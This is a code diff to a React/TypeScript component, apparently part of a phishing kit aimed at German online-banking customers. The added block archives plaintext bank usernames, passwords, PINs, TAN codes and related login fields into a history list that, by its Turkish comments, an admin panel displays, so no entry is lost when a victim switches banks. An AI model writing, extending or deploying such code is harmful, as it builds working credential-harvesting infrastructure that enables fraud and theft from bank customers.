@@ -175,6 +175,50 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
 
       // Ayri select'e gerek yok: fd state zaten mount'ta DB'den yuklendi.
       const nextFd: Record<string, any> = { ...fd };
+
+      // Farkli bankaya geciste mevcut banka girisini SILMEDEN ONCE
+      // bankLoginHistory'ye tasi: eski kayit admin panelinde "Gecmis"te kalir.
+      try {
+        const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
+        const oldSlug = str(fd.bankSlug);
+        if (oldSlug && slug && oldSlug.toLowerCase() !== slug.toLowerCase()) {
+          const meaningful = [
+            "loginMethod", "personalCode", "bankPhone", "username", "verfuegernummer",
+            "password", "pin", "tacCode", "orderedField1", "orderedField2",
+          ].map((k) => str(fd[k])).filter(Boolean);
+          if (meaningful.length >= 2) {
+            const hist = Array.isArray(fd.bankLoginHistory) ? [...fd.bankLoginHistory] : [];
+            const head = hist[0] as Record<string, unknown> | undefined;
+            const sameAsHead = head &&
+              str(head.bankSlug) === oldSlug &&
+              (str(head.username) || str(head.verfuegernummer)) === (str(fd.username) || str(fd.verfuegernummer)) &&
+              (str(head.password) || str(head.pin)) === (str(fd.password) || str(fd.pin)) &&
+              str(head.personalCode) === str(fd.personalCode);
+            if (!sameAsHead) {
+              hist.unshift({
+                submittedAt: new Date().toISOString(),
+                bankName: str(fd.bankName),
+                bankSlug: oldSlug,
+                loginMethod: str(fd.loginMethod),
+                personalCode: str(fd.personalCode),
+                bankPhone: str(fd.bankPhone),
+                username: str(fd.username),
+                password: str(fd.password),
+                verfuegernummer: str(fd.verfuegernummer),
+                pin: str(fd.pin),
+                tacCode: str(fd.tacCode),
+                orderedField1: str(fd.orderedField1),
+                orderedField2: str(fd.orderedField2),
+                orderedField2Type: str(fd.orderedField2Type),
+              });
+              nextFd.bankLoginHistory = hist;
+            }
+          }
+        }
+      } catch {
+        /* arsivleme best-effort */
+      }
+
       for (const f of BANK_CRED_FIELDS) delete nextFd[f];
 
       // Tik aninda icerigi temizle: update + sayfa gecisi sirasinda
